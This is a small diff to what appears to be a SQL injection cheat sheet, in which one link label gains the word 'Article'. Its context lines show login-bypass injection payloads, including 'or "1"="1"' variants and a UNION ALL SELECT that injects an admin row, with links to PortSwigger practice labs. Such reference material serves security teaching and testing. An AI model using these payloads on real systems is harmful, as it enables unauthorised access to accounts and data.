@@ -113,7 +113,7 @@ admin") or "1"="1"#
 admin") or "1"="1"/*
 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
 ```
-- [How to bypass login authentication](https://portswigger.net/support/using-sql-injection-to-bypass-authentication)
+- [How to bypass login authentication (Article)](https://portswigger.net/support/using-sql-injection-to-bypass-authentication)
 - [Practice this payload here](https://portswigger.net/web-security/sql-injection/lab-login-bypass)
 
 ## Determining the number of columns returned by the query with UNION SELECT NULL-- -
